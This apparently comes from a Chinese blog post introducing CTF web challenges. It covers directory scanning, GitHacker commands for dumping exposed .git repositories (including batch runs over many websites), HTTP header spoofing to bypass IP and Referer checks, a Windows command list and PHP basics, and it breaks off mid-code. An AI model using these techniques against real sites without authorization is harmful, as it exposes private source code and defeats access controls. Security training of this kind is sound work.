class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="/img/loading.gif" data-original="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="/img/loading.gif" data-original="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title">最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF/" style="font-size:1.05rem">CTF<sup>10</sup></a><a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size:1.05rem">安全<sup>14</sup></a></div></div><hr></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多"> <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/12/"><span class="card-archive-list-date">十二月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/" itemprop="url">Web</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/CTF/" tabindex="-1" itemprop="url"> <span><i class="anzhiyufont anzhiyu-icon-hashtag"></i>CTF</span></a></span></div></div><h1 class="post-title" itemprop="name headline">web入个门</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-08-06T11:25:58.000Z" title="发表于 2023-08-06 19:25:58">2023-08-06</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-04-10T11:16:35.820Z" title="更新于 2024-04-10 19:16:35">2024-04-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-position" title="作者IP属地为南京"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>南京</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="/img/loading.gif" data-original="/img/10.jpg"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://la2y_fish.gitee.io/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/"><header><a class="post-meta-categories" href="/categories/Web/" itemprop="url">Web</a><a href="/tags/CTF/" tabindex="-1" itemprop="url">CTF</a><h1 id="CrawlerTitle" itemprop="name headline">web入个门</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">1azy_fish.</span><time itemprop="dateCreated datePublished" datetime="2023-08-06T11:25:58.000Z" title="发表于 2023-08-06 19:25:58">2023-08-06</time><time itemprop="dateCreated datePublished" datetime="2024-04-10T11:16:35.820Z" title="更新于 2024-04-10 19:16:35">2024-04-10</time></header><h1 id="CTF-web入门"><a href="#CTF-web入门" class="headerlink" title="CTF_web入门"></a>CTF_web入门</h1><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h3><p>页面源代码是信息的一个重要来处F12和右击查看源代码都可以</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>dirsearch与御剑</p><p>dirsearch安装：<code>apt install dirsearch</code></p><img src="/img/loading.gif" data-original="/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/6.png" title="wuhu"><h3 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h3><p>GitHacker安装与使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install</span></span><br><span class="line">python3 -m pip install -i https://pypi.org/simple/ GitHacker</span><br><span class="line"><span class="comment"># print help info</span></span><br><span class="line">githacker --<span class="built_in">help</span></span><br><span class="line"><span class="comment"># quick start</span></span><br><span class="line">githacker --url http://127.0.0.1/.git/ --output-folder result</span><br><span class="line"><span class="comment"># brute for the name of branchs / tags</span></span><br><span class="line">githacker --brute --url http://127.0.0.1/.git/ --output-folder result</span><br><span class="line"><span class="comment"># exploit multiple websites, one site per line</span></span><br><span class="line">githacker --brute --url-file websites.txt --output-folder result</span><br></pre></td></tr></table></figure><p>可以进入对应文件夹然后使用 <code>git log</code>查看对应日志，通过 <code>git reset --hard xxxxxxxxxxxxxxxxxxxxxxx</code> 以达到恢复已删除内容的效果。</p><h3 id="DS-Store泄露"><a href="#DS-Store泄露" class="headerlink" title="DS_Store泄露"></a>DS_Store泄露</h3><p>工具下载与使用：<a target="_blank" rel="noopener" href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p><h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p>爬虫协议，有时可以通过它看见一些重要的目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /images/</span><br><span class="line">Disallow: /f1ag.txt/</span><br><span class="line">Disallow: /tips.php</span><br></pre></td></tr></table></figure><h3 id="备份文件源码泄漏"><a href="#备份文件源码泄漏" class="headerlink" title="备份文件源码泄漏"></a>备份文件源码泄漏</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ly584521/p/13969810.html">CTF-WEB-信息泄露题目总结 - Ca1m - 博客园 (cnblogs.com)</a></p><h2 id="HTTP学习"><a href="#HTTP学习" class="headerlink" title="HTTP学习"></a>HTTP学习</h2><p>web安全中，入门的时候，你需要理解的是http头的内容，至少</p><h3 id="HTTP请求中的一些请求头"><a href="#HTTP请求中的一些请求头" class="headerlink" title="HTTP请求中的一些请求头"></a>HTTP请求中的一些请求头</h3><blockquote><p>1、Host：指定目标服务器的主机名或IP地址。</p><p>2、User-Agent：指定客户端使用的浏览器或其他应用程序的信息。</p><p>3、Accept：指定客户端能够接受的MIME类型。</p><p>4、Accept-Language：指定客户端首选的自然语言。</p><p>5、Accept-Encoding：指定客户端能够接受的编码方式，例如gzip、deflate等。</p><p>6、Connection：指定客户端与服务器之间使用的连接类型，例如keep-alive或close。</p><p>7、Content-Type：指定请求体的MIME类型，例如application&#x2F;json、application&#x2F;x-www-form-urlencoded等。</p><p>8、Content-Length：指定请求体的长度，以字节为单位。</p><p>9、Referer：指定请求的来源URL，用于告诉服务器用户从哪个页面跳转到当前页面。</p><p>10、Authorization：指定请求的认证信息，例如用户名和密码或访问令牌。</p><p>11、Cookie：指定请求的Cookie信息，用于跟踪用户会话。</p><p>12、If-Modified-Since：指定上次请求资源的时间，服务器可以根据该头部判断资源是否已经被修改过。</p><p>13、User-Agent：指定客户端使用的浏览器或其他应用程序的信息。</p><p>14、Accept-Ranges：指定服务器是否支持分段下载，例如bytes。</p><p>15、Range：指定客户端请求的资源范围，用于实现分段下载或断点续传。</p><p>16、Cache-Control：指定请求或响应的缓存策略，例如max-age、no-cache、no-store等</p></blockquote><h3 id="HTTP请求中的一些常用自定义请求头"><a href="#HTTP请求中的一些常用自定义请求头" class="headerlink" title="HTTP请求中的一些常用自定义请求头"></a>HTTP请求中的一些常用自定义请求头</h3><blockquote><p>X-Forwarded-Host 头部是在HTTP代理或负载均衡器后面使用的。</p><p>X-Forwarded-For：用于记录客户端的IP地址，特别在使用代理服务器时。</p><p>X-Requested-With：用于指示请求的类型，例如XMLHttpRequest。</p><p>X-Csrf-Token：用于防止跨站请求伪造攻击。</p><p>X-Content-Type-Options：用于指示浏览器是否应该自动处理响应体的MIME类型，例如nosniff。</p><p>X-Frame-Options：用于控制页面是否可以嵌入到iframe中，防止点击劫持攻击。</p><p>X-XSS-Protection：用于启用浏览器内置的跨站脚本攻击防护机制。</p><p>X-Powered-By：用于指示服务器所使用的软件名称和版本号。</p></blockquote><h3 id="常见的Content-Type类型包括："><a href="#常见的Content-Type类型包括：" class="headerlink" title="常见的Content-Type类型包括："></a>常见的Content-Type类型包括：</h3><blockquote><p>application&#x2F;json：用于传输JSON格式的数据。</p><p>application&#x2F;x-www-form-urlencoded：用于传输HTML表单数据，即URL编码的键值对。</p><p>multipart&#x2F;form-data：用于传输文件和二进制数据。</p><p>text&#x2F;plain：用于传输纯文本数据。</p></blockquote><h3 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h3><p>HTTP 定义了一组<strong>请求方法</strong>，以表明要对给定资源执行的操作。指示针对给定资源要执行的期望动作。虽然它们也可以是名词，但这些请求方法有时被称为 <em>HTTP 动词</em>。每一个请求方法都实现了不同的语义，但一些共同的特征由一组共享：例如一个请求方法可以是<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/Safe">安全的</a>、<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/Idempotent">幂等的</a>或<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cacheable">可缓存的</a>。</p><ul><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET"><code>GET</code></a></p><p><code>GET</code> 方法请求一个指定资源的表示形式，使用 <code>GET</code> 的请求应该只被用于获取数据。</p></li><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD"><code>HEAD</code></a></p><p><code>HEAD</code> 方法请求一个与 <code>GET</code> 请求的响应相同的响应，但没有响应体。</p></li><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST"><code>POST</code></a></p><p><code>POST</code> 方法用于将实体提交到指定的资源，通常导致在服务器上的状态变化或副作用。</p></li><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/PUT"><code>PUT</code></a></p><p><code>PUT</code> 方法用有效载荷请求替换目标资源的所有当前表示。</p></li><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/DELETE"><code>DELETE</code></a></p><p><code>DELETE</code> 方法删除指定的资源。</p></li><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/CONNECT"><code>CONNECT</code></a></p><p><code>CONNECT</code> 方法建立一个到由目标资源标识的服务器的隧道。</p></li><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS"><code>OPTIONS</code></a></p><p><code>OPTIONS</code> 方法用于描述目标资源的通信选项。</p></li><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/TRACE"><code>TRACE</code></a></p><p><code>TRACE</code> 方法沿着到目标资源的路径执行一个消息环回测试。</p></li><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/PATCH"><code>PATCH</code></a></p><p><code>PATCH</code> 方法用于对资源应用部分修改。</p></li></ul><p>这里常用的是post和get的请求方式</p><h3 id="GET-POST"><a href="#GET-POST" class="headerlink" title="GET&amp;POST"></a>GET&amp;POST</h3><p>Get和Post操作是传参的基本操作，也是CTF中很常见的常规操作，使用<code>hackbar</code>可以很轻松的完成这个任务。</p><p>GET：在<code>url</code>中提交参数，如<code>/index.php?a=1</code></p><p>POST：可通过<code>hackbar</code>或抓包插入post数据提交</p><img src="/img/loading.gif" data-original="/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/post.png" title="wuhu"><p>最直接的区别：</p><p>GET请求的参数是放在URL里的，POST请求参数是放在请求body里的。</p><h3 id="HTTP头部绕过姿势"><a href="#HTTP头部绕过姿势" class="headerlink" title="HTTP头部绕过姿势"></a>HTTP头部绕过姿势</h3><ul><li><p>如果提示需要本地ip或指定ip才能访问，则可在报文头部添加以下几种常用信息段：</p><blockquote><p>X-Forwarded-For: 127.0.0.1<br>X-Client-IP: 127.0.0.1<br>Client-IP: 127.0.0.1</p></blockquote></li><li><p>如果需要验证网页来源，如一定要从谷歌跳转过来的页面才允许访问，则可在报文头部添加：</p><blockquote><p>Referer: <a target="_blank" rel="noopener" href="https://www.google.com/">https://www.google.com</a></p></blockquote></li><li><p>如果网页需要验证cookie，我们可以在http头部加入：</p><blockquote><p>Cookie: xxx&#x3D;xxxxx</p></blockquote></li><li><p>除了以上几种常见的情况，还需根据具体情况来使用不同的操作</p></li></ul><h2 id="Dos命令"><a href="#Dos命令" class="headerlink" title="Dos命令"></a>Dos命令</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ASSOC</span>          显示或修改文件扩展名关联。</span><br><span class="line"><span class="built_in">ATTRIB</span>         显示或更改文件属性。</span><br><span class="line"><span class="built_in">BREAK</span>          设置或清除扩展式 CTRL+C 检查。</span><br><span class="line">BCDEDIT        设置启动数据库中的属性以控制启动加载。</span><br><span class="line"><span class="built_in">CACLS</span>          显示或修改文件的访问控制列表(ACL)。</span><br><span class="line"><span class="keyword">CALL</span>           从另一个批处理程序调用这一个。</span><br><span class="line"><span class="built_in">CD</span>             显示当前目录的名称或将其更改。</span><br><span class="line"><span class="built_in">CHCP</span>           显示或设置活动代码页数。</span><br><span class="line"><span class="built_in">CHDIR</span>          显示当前目录的名称或将其更改。</span><br><span class="line"><span class="built_in">CHKDSK</span>         检查磁盘并显示状态报告。</span><br><span class="line"><span class="built_in">CHKNTFS</span>        显示或修改启动时间磁盘检查。</span><br><span class="line"><span class="built_in">CLS</span>            清除屏幕。</span><br><span class="line"><span class="built_in">CMD</span>            打开另一个 Windows 命令解释程序窗口。</span><br><span class="line"><span class="built_in">COLOR</span>          设置默认控制台前景和背景颜色。</span><br><span class="line"><span class="built_in">COMP</span>           比较两个或两套文件的内容。</span><br><span class="line"><span class="built_in">COMPACT</span>        显示或更改 NTFS 分区上文件的压缩。</span><br><span class="line"><span class="built_in">CONVERT</span>        将 FAT 卷转换成 NTFS。你不能转换</span><br><span class="line">               当前驱动器。</span><br><span class="line"><span class="built_in">COPY</span>           将至少一个文件复制到另一个位置。</span><br><span class="line"><span class="built_in">DATE</span>           显示或设置日期。</span><br><span class="line"><span class="built_in">DEL</span>            删除至少一个文件。</span><br><span class="line"><span class="built_in">DIR</span>            显示一个目录中的文件和子目录。</span><br><span class="line">DISKPART       显示或配置磁盘分区属性。</span><br><span class="line"><span class="built_in">DOSKEY</span>         编辑命令行、撤回 Windows 命令并</span><br><span class="line">               创建宏。</span><br><span class="line">DRIVERQUERY    显示当前设备驱动程序状态和属性。</span><br><span class="line"><span class="built_in">ECHO</span>           显示消息，或将命令回显打开或关闭。</span><br><span class="line"><span class="built_in">ENDLOCAL</span>       结束批文件中环境更改的本地化。</span><br><span class="line"><span class="built_in">ERASE</span>          删除一个或多个文件。</span><br><span class="line"><span class="keyword">EXIT</span>           退出 <span class="built_in">CMD</span>.EXE 程序(命令解释程序)。</span><br><span class="line">FC             比较两个文件或两个文件集并显示</span><br><span class="line">               它们之间的不同。</span><br><span class="line"><span class="built_in">FIND</span>           在一个或多个文件中搜索一个文本字符串。</span><br><span class="line"><span class="built_in">FINDSTR</span>        在多个文件中搜索字符串。</span><br><span class="line"><span class="keyword">FOR</span>            为一组文件中的每个文件运行一个指定的命令。</span><br><span class="line"><span class="built_in">FORMAT</span>         格式化磁盘，以便用于 Windows。</span><br><span class="line">FSUTIL         显示或配置文件系统属性。</span><br><span class="line"><span class="built_in">FTYPE</span>          显示或修改在文件扩展名关联中使用的文件</span><br><span class="line">               类型。</span><br><span class="line"><span class="keyword">GOTO</span>           将 Windows 命令解释程序定向到批处理程序</span><br><span class="line">               中某个带标签的行。</span><br><span class="line">GPRESULT       显示计算机或用户的组策略信息。</span><br><span class="line"><span class="built_in">GRAFTABL</span>       使 Windows 在图形模式下显示扩展</span><br><span class="line">               字符集。</span><br><span class="line"><span class="built_in">HELP</span>           提供 Windows 命令的帮助信息。</span><br><span class="line">ICACLS         显示、修改、备份或还原文件和</span><br><span class="line">               目录的 ACL。</span><br><span class="line"><span class="keyword">IF</span>             在批处理程序中执行有条件的处理操作。</span><br><span class="line"><span class="built_in">LABEL</span>          创建、更改或删除磁盘的卷标。</span><br><span class="line"><span class="built_in">MD</span>             创建一个目录。</span><br><span class="line"><span class="built_in">MKDIR</span>          创建一个目录。</span><br><span class="line">MKLINK         创建符号链接和硬链接</span><br><span class="line"><span class="built_in">MODE</span>           配置系统设备。</span><br><span class="line"><span class="built_in">MORE</span>           逐屏显示输出。</span><br><span class="line"><span class="built_in">MOVE</span>           将一个或多个文件从一个目录移动到另一个</span><br><span class="line">               目录。</span><br><span class="line">OPENFILES      显示远程用户为了文件共享而打开的文件。</span><br><span class="line"><span class="built_in">PATH</span>           为可执行文件显示或设置搜索路径。</span><br><span class="line"><span class="built_in">PAUSE</span>          暂停批处理文件的处理并显示消息。</span><br><span class="line"><span class="built_in">POPD</span>           还原通过 <span class="built_in">PUSHD</span> 保存的当前目录的上一个</span><br><span class="line">               值。</span><br><span class="line"><span class="built_in">PRINT</span>          打印一个文本文件。</span><br><span class="line">PROMPT         更改 Windows 命令提示。</span><br><span class="line"><span class="built_in">PUSHD</span>          保存当前目录，然后对其进行更改。</span><br><span class="line"><span class="built_in">RD</span>             删除目录。</span><br><span class="line"><span class="built_in">RECOVER</span>        从损坏的或有缺陷的磁盘中恢复可读信息。</span><br><span class="line"><span class="comment">REM            记录批处理文件或 CONFIG.SYS 中的注释(批注)。</span></span><br><span class="line"><span class="built_in">REN</span>            重命名文件。</span><br><span class="line"><span class="built_in">RENAME</span>         重命名文件。</span><br><span class="line"><span class="built_in">REPLACE</span>        替换文件。</span><br><span class="line"><span class="built_in">RMDIR</span>          删除目录。</span><br><span class="line">ROBOCOPY       复制文件和目录树的高级实用工具</span><br><span class="line"><span class="built_in">SET</span>            显示、设置或删除 Windows 环境变量。</span><br><span class="line"><span class="built_in">SETLOCAL</span>       开始本地化批处理文件中的环境更改。</span><br><span class="line">SC             显示或配置服务(后台进程)。</span><br><span class="line">SCHTASKS       安排在一台计算机上运行命令和程序。</span><br><span class="line"><span class="built_in">SHIFT</span>          调整批处理文件中可替换参数的位置。</span><br><span class="line">SHUTDOWN       允许通过本地或远程方式正确关闭计算机。</span><br><span class="line"><span class="built_in">SORT</span>           对输入排序。</span><br><span class="line"><span class="built_in">START</span>          启动单独的窗口以运行指定的程序或命令。</span><br><span class="line"><span class="built_in">SUBST</span>          将路径与驱动器号关联。</span><br><span class="line">SYSTEMINFO     显示计算机的特定属性和配置。</span><br><span class="line">TASKLIST       显示包括服务在内的所有当前运行的任务。</span><br><span class="line"><span class="built_in">TASKKILL</span>       中止或停止正在运行的进程或应用程序。</span><br><span class="line"><span class="built_in">TIME</span>           显示或设置系统时间。</span><br><span class="line"><span class="built_in">TITLE</span>          设置 <span class="built_in">CMD</span>.EXE 会话的窗口标题。</span><br><span class="line"><span class="built_in">TREE</span>           以图形方式显示驱动程序或路径的目录</span><br><span class="line">               结构。</span><br><span class="line"><span class="built_in">TYPE</span>           显示文本文件的内容。</span><br><span class="line"><span class="built_in">VER</span>            显示 Windows 的版本。</span><br><span class="line"><span class="built_in">VERIFY</span>         告诉 Windows 是否进行验证，以确保文件</span><br><span class="line">               正确写入磁盘。</span><br><span class="line"><span class="built_in">VOL</span>            显示磁盘卷标和序列号。</span><br><span class="line"><span class="built_in">XCOPY</span>          复制文件和目录树。</span><br><span class="line">WMIC           在交互式命令 shell 中显示 WMI 信息。</span><br></pre></td></tr></table></figure><h2 id="php语法快速入门（看得懂就行版本）"><a href="#php语法快速入门（看得懂就行版本）" class="headerlink" title="php语法快速入门（看得懂就行版本）"></a>php语法快速入门（看得懂就行版本）</h2><p>当你开始学习 PHP 语法时，以下是一些基本概念和语法规则，可以帮助你快速入门：</p><ol><li>语法标记：PHP 代码通常包含在 <code>&lt;?php</code> 和 <code>?&gt;</code> 标记之间。例如：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// PHP 代码在这里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>注释：使用注释可以在代码中添加说明性文字，对于自己和其他人来说都很有用。PHP 支持单行注释和多行注释。例如：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是单行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这是</span></span><br><span class="line"><span class="comment">多行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ol start="3"><li>变量：用于存储和操作数据的容器。在 PHP 中，变量以美元符号 <code>$</code> 开头，后面跟着变量名。变量名可以包含字母、数字和下划线，但必须以字母或下划线开头。PHP 是一种弱类型语言，变量的类型会根据赋值的内容自动确定。例如：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="string">&quot;John&quot;</span>; <span class="comment">// 字符串类型的变量</span></span><br><span class="line"><span class="variable">$age</span> = <span class="number">25</span>; <span class="comment">// 整数类型的变量</span></span><br></pre></td></tr></table></figure><ol start="4"><li>数据类型：PHP 支持多种数据类型，包括字符串、整数、浮点数、布尔值、数组、对象等。根据需要，你可以根据数据类型执行相应的操作。例如：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello&quot;</span>; <span class="comment">// 字符串类型</span></span><br><span class="line"><span class="variable">$num</span> = <span class="number">10</span>; <span class="comment">// 整数类型</span></span><br><span class="line"><span class="variable">$pi</span> = <span class="number">3.14</span>; <span class="comment">// 浮点数类型</span></span><br><span class="line"><span class="variable">$isTrue</span> = <span class="literal">true</span>; <span class="comment">// 布尔值类型</span></span><br></pre></td></tr></table></figure><ol start="5"><li>输出内容：使用 <code>echo</code> 或 <code>print</code> 关键字可以将内容输出到浏览器。例如：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello, World!&quot;</span>; <span class="comment">// 输出字符串</span></span><br><span class="line"><span class="variable">$num</span> = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>; <span class="comment">// 输出变量的值</span></span><br></pre></td></tr></table></figure><ol start="6"><li>条件语句：使用条件语句可以根据条件的真假执行不同的代码块。常见的条件语句有 <code>if</code>、<code>else if</code> 和 <code>else</code>。例如：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 